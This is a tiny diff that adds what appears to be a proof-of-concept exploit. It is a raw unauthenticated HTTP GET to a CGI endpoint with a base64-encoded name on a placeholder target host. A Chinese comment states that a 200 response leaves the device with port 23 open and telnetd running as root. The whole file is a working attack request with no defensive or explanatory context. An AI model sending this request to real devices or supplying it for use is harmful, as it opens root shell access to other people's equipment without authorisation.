@@ -1,0 +1,5 @@
+GET /cgi-bin/bXB0b29sZW5hYmxl.cgi HTTP/1.0
+Host: <target>
+User-Agent: poc-find-0001
+
+(无需任何认证; 响应 200 后目标设备 23 端口开放, telnetd 以 root 运行)
